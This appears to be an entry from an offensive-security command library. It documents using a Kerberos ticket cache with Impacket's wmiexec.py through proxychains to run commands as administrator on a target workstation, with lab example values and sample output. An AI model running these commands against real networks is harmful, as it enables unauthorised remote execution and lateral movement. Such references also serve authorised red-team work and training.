---
type: command
executor: bash
data: >-
  export KRB5CCNAME=$_TGS_CCACHER

  proxychains python3 wmiexec.py -k -no-pass
  $_DOMAIN/$_TARGET_USER@$_TARGET_WORKSTATION
tags:
  - kerberos
  - wmi
  - remote-execution
platforms:
  - Linux
verified: true
validated: true
---

# export-krb5ccname-and-wmiexec-kerberos-execution

## Command

```bash
export KRB5CCNAME=$_TGS_CCACHER
proxychains python3 wmiexec.py -k -no-pass $_DOMAIN/$_TARGET_USER@$_TARGET_WORKSTATION
```

## Description

Exports a Kerberos credential cache and uses it to execute commands remotely via WMI on a target workstation without passing passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TGS_CCACHER | Path to TGS ccache file (e.g., administrator_ws2.ccache) | Yes |
| -k | Use Kerberos authentication | Yes |
| -no-pass | No password prompt | Yes |
| $_DOMAIN | Domain (e.g., ez.lab) | Yes |
| $_TARGET_USER | Target user (e.g., administrator) | Yes |
| $_TARGET_WORKSTATION | Target host (e.g., ws2.ez.lab) | Yes |
| proxychains | Proxy if needed | No |

## Examples

### Basic Usage

```bash
export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
```

### Advanced Usage

```bash
export KRB5CCNAME=tgs.ccache
proxychains python3 wmiexec.py -k -no-pass domain/user@host 'whoami'
```

## Expected Output

[*] Connecting to ...
[*] Executing command ...
administrator

## Related

- [[procedures/Workstation-Takeover-with-RBCD]]
- [[tools/Impacket]]
